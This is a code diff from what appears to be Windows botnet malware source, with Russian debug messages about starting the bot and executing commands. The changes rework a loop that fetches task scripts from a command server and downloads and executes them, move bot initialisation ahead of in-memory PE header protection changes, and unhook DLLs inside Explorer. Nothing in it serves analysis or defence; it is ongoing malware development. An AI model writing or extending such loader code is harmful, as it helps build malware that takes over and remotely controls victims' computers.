@@ -136,22 +136,10 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	{
 		MDBG("Main", "=====>> Стартуем выполнение команд");
 
-		PCHAR URL;
 		while (true)
 		{
-			MDBG("Main", "=====>> Выполняем команду:");
 
-			URL = GetBotScriptURL(SCRIPT_TASK);
-			
-			// Загружаем и выполняем команду
-			if (URL != NULL)
-			{
-				MDBG("Main", URL);
-				DownloadAndExecuteCommand(NULL, URL);
-				STR::Free(URL);
-			}
-			else
-				MDBG("Main", "=====>> Ошибка: Сервер не доступен!");
+			DownloadAndExecuteCommand(NULL, NULL);
 
 			// "Гениальность" проектирования взаимосвязи бота и его сервера
 			// отправка стартовой информации должна идти только после получения
@@ -175,7 +163,8 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 void ExplorerMain()
 {
 	MDBG("Main", "----------------- ExplorerMain -----------------");
-	
+
+
 	if ( !dwExplorerSelf )
 		UnhookDlls();
 
@@ -242,6 +231,9 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 
 int APIENTRY MyMain() 
 {
+	BOT::Initialize();
+
+	
 	DWORD* pVirtualAddr = (DWORD*)MagicValue;
 
 	if ( *pVirtualAddr )
@@ -256,7 +248,6 @@ int APIENTRY MyMain()
 		pVirtualProtect( ImageBase, pHeaders->OptionalHeader.SizeOfHeaders, Old, &Old );
 	}	
 
-	BOT::Initialize();
 
 	MDBG("Main", "Запускается бот. Версия бота %s", BOT_VERSION);
 
